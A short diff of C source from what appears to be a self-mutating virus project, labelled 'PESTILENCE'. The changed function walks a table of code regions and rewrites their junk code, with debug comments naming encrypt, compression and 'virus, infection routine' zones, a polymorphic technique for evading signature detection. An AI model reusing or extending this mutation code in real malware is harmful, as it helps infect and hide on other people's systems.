@@ -51,20 +51,21 @@ void ft_srand(){
 }
 
 void change_garbage_code(){
-		ft_srand();
-		int x = (size_t)(&cmpr_start) - (size_t)(&bin_start);
-		debug_ext("zone 1:", 0," to ", x-1, " (start, encrypt routine, ...)\n");
-		int x2 = (size_t)(&crypt_start) - (size_t)(&bin_start);
-		debug_ext("zone 2:", x," to ", x2-1, " (compression routine, ...)\n");
-		int x3 = (size_t)(&crypt_end) - (size_t)(&bin_start);
-		debug_ext("zone 3:", x2," to ", x3-1, " (virus, infection routine, ...)\n");
+	ft_srand();
+	int x = (size_t)(&cmpr_start) - (size_t)(&bin_start);
+	debug_ext("zone 1:", 0," to ", x-1, " (start, encrypt routine, ...)\n");
+	int x2 = (size_t)(&crypt_start) - (size_t)(&bin_start);
+	debug_ext("zone 2:", x," to ", x2-1, " (compression routine, ...)\n");
+	int x3 = (size_t)(&crypt_end) - (size_t)(&bin_start);
+	debug_ext("zone 3:", x2," to ", x3-1, " (virus, infection routine, ...)\n");
+	debug_ext("----------- output first 10 /", garbage_table_len, " of gb codes -----------\n");
 
-		debug_ext("----------- output first 10 /", garbage_table_len, " of gb codes -----------\n");
-		for (size_t i = 0 ; i < garbage_table_len; i++){
-				if (i < 10) { debug_ext("",i+1,": "); }
-				generate_garb(((unsigned char *)(&bin_start)) + garbage_table[i].off, garbage_table[i].len);
-		}
-		debug_ext("\n");
+	unsigned char *prev = NULL;
+	for (size_t i = 0 ; i < garbage_table_len; i++){
+		generate_garb(((unsigned char *)(&bin_start)) + garbage_table[i].off, garbage_table[i].len, prev);
+		prev = ((unsigned char *)(&bin_start)) + garbage_table[i].off + garbage_table[i].len;
+	}
+	debug_ext("\n");
 }
 
 //======================= PESTILENCE =========================
